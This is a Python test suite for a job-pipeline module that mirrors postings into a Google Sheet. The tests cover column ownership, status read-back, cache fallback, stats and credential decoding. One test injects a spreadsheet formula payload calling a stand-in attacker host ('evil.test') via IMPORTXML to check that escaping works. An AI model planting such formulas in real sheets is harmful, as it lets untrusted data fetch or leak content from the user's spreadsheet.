"""Sheets mirror.

The property under test throughout is negative: what the pipeline must *not*
do to the spreadsheet. Columns I onward hold the user's status, notes and
follow-ups, and unlike every posting in this system they cannot be re-fetched
from anywhere. A test that reaches the live sheet is blocked by an autouse
fixture in conftest; everything here runs against a fake.
"""

from __future__ import annotations

import json
import re
from datetime import datetime, timedelta, timezone

import pytest

from jobpipe.models import Posting, Status, Term, Tier
from jobpipe.sheets import mirror
from jobpipe.sheets.client import SheetsClient, SheetsError, decode_key
from jobpipe.sheets.mirror import (
    FIRST_DATA_ROW, LIVE_HEADERS, apply_statuses, escape, index_rows, live_row,
    parse_statuses, plan, read_cache, read_statuses, stats_block, sync_live,
    write_cache,
)

NOW = datetime(2026, 8, 7, 12, 0, tzinfo=timezone.utc)


def posting(
    *, id_="0" * 16, company="Acme", title="Software Engineer, New Grad",
    term=Term.NEW_GRAD, tier=Tier.DIGEST, score=50, days_ago=1,
    status=Status.NEW, remote=False,
) -> Posting:
    when = NOW - timedelta(days=days_ago)
    return Posting(
        id=id_, dedupe_key=f"{company}|{title}", company=company, title=title,
        term=term, location="San Francisco, CA", location_norm="sf-bay",
        remote=remote, apply_url=f"https://example.test/{id_}", source="stub",
        first_seen_at=when, last_seen_at=NOW, posted_at=when,
        tier=tier, score=score, status=status, link_status="ok",
    )


class FakeSheets:
    """Records every call. Reads are canned; writes are just captured."""

    def __init__(self, ranges: dict[str, list[list[str]]] | None = None, *, rows=20_000):
        self.ranges = ranges or {}
        self.writes: list[tuple[str, list[list]]] = []
        self.batch_updates: list[list[dict]] = []
        self.reads: list[str] = []
        self.fail_reads = False
        self.rows = rows

    def tab_properties(self):
        return {"Live": {"sheetId": 0, "rows": self.rows},
                "Backlog": {"sheetId": 1, "rows": 3_000},
                "Stats": {"sheetId": 2, "rows": 1_000}}

    def read(self, a1):
        self.reads.append(a1)
        if self.fail_reads:
            raise SheetsError("simulated outage")
        return self.ranges.get(a1, [])

    def write(self, writes):
        self.writes.extend(writes)
        return sum(len(v) * len(v[0]) for _, v in writes if v)

    def batch_update(self, requests_):
        self.batch_updates.append(requests_)
        return {}

    # Convenience for assertions.
    @property
    def written_ranges(self) -> list[str]:
        return [a1 for a1, _ in self.writes]


def live_sheet(ids: list[str]) -> dict:
    return {
        "'Live'!A1:H1": [LIVE_HEADERS],
        f"'Live'!A{FIRST_DATA_ROW}:J": [[i] for i in ids],
    }


# --------------------------------------------------------------------------
# Column ownership. Everything else is detail.
# --------------------------------------------------------------------------


class TestColumnOwnership:
    def test_no_write_ever_extends_past_column_h(self):
        sheet = FakeSheets(live_sheet(["a" * 16]))
        sync_live(sheet, [posting(id_="a" * 16), posting(id_="b" * 16)])
        assert sheet.writes
        for a1 in sheet.written_ranges:
            end = re.search(r":([A-Z]+)\d+$", a1).group(1)
            assert end == "H", f"{a1} reaches past the pipeline's columns"

    def test_an_existing_row_is_updated_in_place_not_appended(self):
        """Appending a second row for an id the sheet already has would orphan
        every note the user attached to the first."""
        sheet = FakeSheets(live_sheet(["a" * 16, "b" * 16, "c" * 16]))
        sync_live(sheet, [posting(id_="b" * 16, company="Renamed")])
        assert sheet.written_ranges == ["'Live'!A3:H3"]

    def test_new_postings_land_below_the_last_used_row(self):
        sheet = FakeSheets(live_sheet(["a" * 16, "b" * 16]))
        sync_live(sheet, [posting(id_="c" * 16), posting(id_="d" * 16)])
        assert sheet.written_ranges == ["'Live'!A4:H5"]

    def test_nothing_clears_deletes_or_resizes(self):
        sheet = FakeSheets(live_sheet(["a" * 16]))
        sync_live(sheet, [posting(id_="a" * 16), posting(id_="z" * 16)])
        assert sheet.batch_updates == [], "the poll path must make no structural call"

    def test_a_gap_in_the_id_column_does_not_shift_later_rows(self):
        """A user-inserted blank row must not make every id below it point at
        the wrong posting."""
        sheet = FakeSheets({
            "'Live'!A1:H1": [LIVE_HEADERS],
            "'Live'!A2:J": [["a" * 16], [], ["c" * 16]],
        })
        sync_live(sheet, [posting(id_="c" * 16, company="Third")])
        assert sheet.written_ranges == ["'Live'!A4:H4"]

    def test_refuses_to_write_when_the_headers_are_not_ours(self):
        """If A-H have been reordered, writing by position puts a company name
        wherever B now is."""
        sheet = FakeSheets({"'Live'!A1:H1": [["id", "title", "company"]]})
        with pytest.raises(SheetsError, match="Refusing to write"):
            sync_live(sheet, [posting()])
        assert sheet.writes == []

    def test_refuses_to_write_into_an_empty_sheet(self):
        sheet = FakeSheets({})
        with pytest.raises(SheetsError, match="sheets setup"):
            sync_live(sheet, [posting()])
        assert sheet.writes == []


class TestPlan:
    def test_updates_are_one_range_per_row(self):
        """A contiguous block spanning scattered rows would overwrite the rows
        in between with whatever the payload happened to contain."""
        existing = {"a" * 16: 2, "z" * 16: 40}
        writes = plan([posting(id_="a" * 16), posting(id_="z" * 16)], existing, 40)
        assert [a1 for a1, _ in writes] == ["'Live'!A2:H2", "'Live'!A40:H40"]

    def test_expired_postings_are_not_appended_but_are_still_updated(self):
        """A row already carrying notes stays current; a req that died before
        it was ever seen does not earn a line."""
        dead_new = posting(id_="n" * 16, status=Status.EXPIRED)
        dead_known = posting(id_="k" * 16, status=Status.EXPIRED)
        writes = plan([dead_new, dead_known], {"k" * 16: 5}, 5)
        assert [a1 for a1, _ in writes] == ["'Live'!A5:H5"]

    def test_nothing_to_do_writes_nothing(self):
        assert plan([], {}, 1) == []


class TestIndexRows:
    def test_first_occurrence_wins(self):
        """A duplicated id means the user copied a row. Updating the first and
        leaving the second is strictly safer than writing both."""
        assert index_rows([["a"], ["b"], ["a"]]) == {"a": 2, "b": 3}

    def test_blank_and_ragged_rows_are_skipped_without_shifting(self):
        assert index_rows([["a"], [], ["  "], ["d"]]) == {"a": 2, "d": 5}


# --------------------------------------------------------------------------
# Values
# --------------------------------------------------------------------------


class TestRowValues:
    def test_posted_date_is_an_iso_date_not_an_age(self):
        """Sheets sorts text lexically, so "10d" lands above "2d" and the
        column silently lies about which req is newer."""
        row = live_row(posting(days_ago=3))
        assert row[6] == "2026-08-04"

    def test_missing_posted_at_is_blank_not_a_guess(self):
        p = posting()
        p.posted_at = None
        assert live_row(p)[6] == ""

    def test_row_is_exactly_the_owned_columns(self):
        assert len(live_row(posting())) == len(LIVE_HEADERS) == 8

    def test_remote_is_noted_in_the_location_cell(self):
        assert "remote" in live_row(posting(remote=True))[5]

    @pytest.mark.parametrize("payload", [
        '=IMPORTXML("http://evil.test","//x")',
        "+1-800-CALL",
        "-Engineer",
        "@channel",
    ])
    def test_a_feed_supplied_title_cannot_become_a_formula(self, payload):
        """USER_ENTERED is required for the date column to arrive as a date,
        and it evaluates anything starting = + - @. These titles come from
        third-party feeds straight into a spreadsheet the user opens."""
        assert escape(payload).startswith("'")
        assert live_row(posting(title=payload))[2].startswith("'")

    def test_ordinary_text_is_untouched(self):
        assert escape("Software Engineer, New Grad") == "Software Engineer, New Grad"
        assert escape(None) == ""


# --------------------------------------------------------------------------
# Read-back
# --------------------------------------------------------------------------


class TestParseStatuses:
    def test_reads_the_status_and_date_columns(self):
        rows = [["a" * 16, "", "", "", "", "", "", "", "Applied", "2026-08-01"]]
        statuses, unknown = parse_statuses(rows)
        assert statuses == {"a" * 16: {"status": "applied", "applied_on": "2026-08-01"}}
        assert unknown == []

    def test_a_blank_status_is_undecided_not_a_reset(self):
        """Treating blank as "un-apply" would let one short response from
        Sheets clear every decision the user has recorded."""
        rows = [["a" * 16] + [""] * 9]
        assert parse_statuses(rows)[0] == {}

    def test_a_short_row_is_not_a_blank_status(self):
        """Sheets truncates trailing empties, so a row with no notes arrives
        shorter than one with notes. Neither says anything about status."""
        assert parse_statuses([["a" * 16]])[0] == {}

    def test_an_unrecognised_word_is_left_alone_and_reported(self):
        rows = [["a" * 16] + [""] * 7 + ["maybe later"]]
        statuses, unknown = parse_statuses(rows)
        assert statuses == {}
        assert unknown == ["maybe later"]

    def test_case_is_ignored(self):
        rows = [["a" * 16] + [""] * 7 + ["APPLIED"]]
        assert parse_statuses(rows)[0]["a" * 16]["status"] == "applied"

    def test_rows_with_no_id_are_skipped(self):
        assert parse_statuses([["", "", "", "", "", "", "", "", "Applied"]])[0] == {}


class TestFailOpen:
    def test_an_outage_falls_back_to_the_cache(self, tmp_path):
        cache = tmp_path / "sheet-status.json"
        write_cache(cache, {"a" * 16: {"status": "applied", "applied_on": "2026-08-01"}})
        sheet = FakeSheets()
        sheet.fail_reads = True
        statuses, source = read_statuses(sheet, cache)
        assert source == "cache"
        assert statuses["a" * 16]["status"] == "applied"

    def test_an_outage_with_no_cache_returns_nothing_and_does_not_raise(self, tmp_path):
        """No cache must mean "change nothing", never "everything is
        unapplied" - a network failure cannot be allowed to invent backlog."""
        sheet = FakeSheets()
        sheet.fail_reads = True
        statuses, source = read_statuses(sheet, tmp_path / "absent.json")
        assert statuses == {}
        assert source == "unavailable"

    def test_a_corrupt_cache_degrades_to_no_cache(self, tmp_path):
        cache = tmp_path / "sheet-status.json"
        cache.write_text("{not json", encoding="utf-8")
        assert read_cache(cache) == {}

    def test_a_cache_holding_junk_statuses_is_filtered(self, tmp_path):
        cache = tmp_path / "c.json"
        cache.write_text(json.dumps({"statuses": {
            "a" * 16: {"status": "applied"},
            "b" * 16: {"status": "= DROP TABLE"},
            "c" * 16: "not a dict",
        }}), encoding="utf-8")
        assert set(read_cache(cache)) == {"a" * 16}

    def test_the_cache_is_deterministic(self, tmp_path):
        """It is committed, so an unchanged week must produce no diff."""
        cache = tmp_path / "c.json"
        statuses = {"b" * 16: {"status": "applied", "applied_on": ""},
                    "a" * 16: {"status": "skipped", "applied_on": ""}}
        assert write_cache(cache, statuses) is True
        assert write_cache(cache, dict(reversed(list(statuses.items())))) is False


class TestApplyStatuses:
    def test_applied_in_the_sheet_becomes_applied_in_the_store(self, store):
        """This is what makes the backlog count real: it counts postings still
        sitting at `notified`."""
        p = posting(id_="a" * 16, status=Status.NOTIFIED)
        store.upsert([p])
        store.set_status(p.id, Status.NOTIFIED)
        n = apply_statuses(store, {p.id: {"status": "applied", "applied_on": ""}})
        assert n == 1
        assert store.get(p.id).status is Status.APPLIED

    def test_an_id_the_store_does_not_have_is_ignored(self, store):
        assert apply_statuses(store, {"z" * 16: {"status": "applied"}}) == 0

    def test_an_unchanged_status_is_not_rewritten(self, store):
        p = posting(id_="a" * 16)
        store.upsert([p])
        store.set_status(p.id, Status.APPLIED)
        assert apply_statuses(store, {p.id: {"status": "applied"}}) == 0

    def test_interviewing_counts_as_applied_and_rejected_as_skipped(self, store):
        for id_, raw, expected in (
            ("a" * 16, "interviewing", Status.APPLIED),
            ("b" * 16, "rejected", Status.SKIPPED),
        ):
            store.upsert([posting(id_=id_, company=f"Co-{id_[:2]}")])
            apply_statuses(store, {id_: {"status": raw}})
            assert store.get(id_).status is expected


# --------------------------------------------------------------------------
# Stats
# --------------------------------------------------------------------------


class TestStats:
    def _rows(self, block):
        return {r[0]: r[1] for r in block if r[0]}

    def test_counts_applied_this_week_and_total(self):
        postings = [posting(id_=f"{i:016x}") for i in range(3)]
        statuses = {
            f"{0:016x}": {"status": "applied", "applied_on": "2026-08-05"},
            f"{1:016x}": {"status": "applied", "applied_on": "2026-07-01"},
            f"{2:016x}": {"status": "skipped", "applied_on": ""},
        }
        rows = self._rows(stats_block(postings, statuses, now=NOW))
        assert rows["Applied this week"] == 1
        assert rows["Applied, total"] == 2

    def test_an_undated_application_counts_in_the_total_only(self):
        """Guessing a date would put an invented number in a statistic about
        the user's own effort."""
        postings = [posting(id_="a" * 16)]
        statuses = {"a" * 16: {"status": "applied", "applied_on": ""}}
        rows = self._rows(stats_block(postings, statuses, now=NOW))
        assert rows["Applied, total"] == 1
        assert rows["Applied this week"] == 0
        assert rows["  of which undated in column J"] == 1

    def test_an_unparseable_date_costs_one_statistic_not_a_run(self):
        statuses = {"a" * 16: {"status": "applied", "applied_on": "last tuesday"}}
        rows = self._rows(stats_block([posting(id_="a" * 16)], statuses, now=NOW))
        assert rows["Applied this week"] == 0
        assert rows["Applied, total"] == 1

    def test_breaks_down_by_term_and_tier(self):
        postings = [
            posting(id_="a" * 16, term=Term.FALL_2026, tier=Tier.INTERRUPTING),
            posting(id_="b" * 16, term=Term.NEW_GRAD, tier=Tier.SILENT),
        ]
        statuses = {p.id: {"status": "applied", "applied_on": "2026-08-06"} for p in postings}
        rows = self._rows(stats_block(postings, statuses, now=NOW))
        assert rows["fall-2026"] == 1 and rows["new-grad"] == 1
        assert rows["tier 1"] == 1 and rows["tier 2"] == 1

    def test_the_stats_range_is_padded_so_a_shorter_block_leaves_no_tail(self):
        """There is no clear anywhere in this package, so the write has to
        cover what a previous longer block occupied."""
        sheet = FakeSheets()
        mirror.sync_stats(sheet, [posting()], {}, now=NOW)
        (a1, values), = sheet.writes
        assert a1 == "'Stats'!A1:B40"
        assert len(values) == 40


# --------------------------------------------------------------------------
# Credentials
# --------------------------------------------------------------------------


class TestDecodeKey:
    def _key(self):
        return {"client_email": "x@y.iam.gserviceaccount.com",
                "private_key": "-----BEGIN...", "token_uri": "https://oauth2..."}

    def test_accepts_base64(self):
        import base64
        raw = base64.b64encode(json.dumps(self._key()).encode()).decode()
        assert decode_key(raw)["client_email"].endswith("gserviceaccount.com")

    def test_accepts_plain_json(self):
        """The instructions say base64; pasting the JSON is the obvious thing
        to do instead, and failing on it wastes an evening."""
        assert decode_key(json.dumps(self._key()))["token_uri"].startswith("https")

    def test_names_the_missing_field(self):
        with pytest.raises(SheetsError, match="private_key"):
            decode_key(json.dumps({"client_email": "a", "token_uri": "b"}))

    def test_never_echoes_the_key_material(self):
        secret = "SUPERSECRETPRIVATEKEYMATERIAL"
        with pytest.raises(SheetsError) as exc:
            decode_key(secret)
        assert secret not in str(exc.value)

    @pytest.mark.parametrize("raw", ["", "   "])
    def test_empty_is_a_clear_error(self, raw):
        with pytest.raises(SheetsError, match="empty"):
            decode_key(raw)


class TestTheGuardItself:
    def test_a_real_client_cannot_reach_the_network_from_a_test(self):
        """If this ever stops raising, every other test in this file is
        writing to the user's live spreadsheet."""
        client = SheetsClient("some-sheet-id", "{}")
        with pytest.raises(AssertionError, match="live Sheets call"):
            client.read("'Live'!A1:H1")

    def test_credentials_are_not_visible_to_tests(self):
        import os

        assert os.environ.get("GOOGLE_SA_KEY") is None
        assert os.environ.get("GOOGLE_SHEET_ID") is None


class TestGridCapacity:
    """A write past the last grid row is rejected outright - Sheets does not
    grow the tab to fit. A default 1000-row sheet is eight days of headroom at
    ~70 postings a day, so this has to be visible long before it bites."""

    def test_reports_remaining_room(self):
        sheet = FakeSheets(live_sheet(["a" * 16]), rows=20_000)
        result = sync_live(sheet, [posting(id_="a" * 16)])
        assert result["free_rows"] == 20_000 - 2
        assert result["room_low"] is False

    def test_flags_a_tab_that_is_nearly_full(self):
        sheet = FakeSheets(live_sheet([f"{i:016x}" for i in range(900)]), rows=1_000)
        result = sync_live(sheet, [posting(id_="f" * 16)])
        assert result["room_low"] is True

    def test_refuses_rather_than_writing_past_the_grid(self):
        sheet = FakeSheets(live_sheet([f"{i:016x}" for i in range(999)]), rows=1_000)
        with pytest.raises(SheetsError, match="out of grid rows"):
            sync_live(sheet, [posting(id_="f" * 16)])
        assert sheet.writes == []

    def test_an_unreadable_tab_list_costs_the_warning_not_the_write(self):
        sheet = FakeSheets(live_sheet(["a" * 16]))
        sheet.tab_properties = lambda: (_ for _ in ()).throw(SheetsError("nope"))
        result = sync_live(sheet, [posting(id_="a" * 16)])
        assert "free_rows" not in result
        assert sheet.writes


class TestUserRowsBelowTheData:
    def test_a_note_row_with_no_id_is_not_written_over(self):
        """Sheets truncates trailing empties, so reading column A alone stops
        at the last row the pipeline filled - and a row the user added below
        it, with a note in I and nothing in A, is invisible to that read. The
        append would land on top of it. His note survives, because nothing
        writes past H, but it ends up beside a posting he never chose."""
        sheet = FakeSheets({
            "'Live'!A1:H1": [LIVE_HEADERS],
            "'Live'!A2:J": [
                ["a" * 16],
                ["", "", "", "", "", "", "", "", "", "my own note row"],
            ],
        })
        sync_live(sheet, [posting(id_="z" * 16)])
        assert sheet.written_ranges == ["'Live'!A4:H4"]


class TestStatsHeight:
    def test_the_block_always_fits_its_padded_range(self):
        """`sync_stats` truncates to a fixed height because there is no clear
        in this package. Every term and tier at once is the worst case."""
        postings = [
            posting(id_=f"{i:016x}", term=t, tier=tier)
            for i, (t, tier) in enumerate(
                [(t, tier) for t in Term for tier in Tier]
            )
        ]
        statuses = {
            p.id: {"status": "applied", "applied_on": "2026-08-06"} for p in postings
        }
        rows = stats_block(postings, statuses, now=NOW)
        assert len(rows) <= 40, f"stats block is {len(rows)} rows, range holds 40"


class TestUndecidedLeads:
    """The backlog count stopped suppressing anything when tier 2 became
    digest-only. Its job now is to be read, so it goes first and in words."""

    def test_undecided_is_the_first_row_of_stats(self):
        postings = [posting(id_=f"{i:016x}") for i in range(5)]
        statuses = {postings[0].id: {"status": "applied", "applied_on": "2026-08-06"}}
        rows = stats_block(postings, statuses, now=NOW)
        assert rows[0] == ["You haven't decided on", 4]
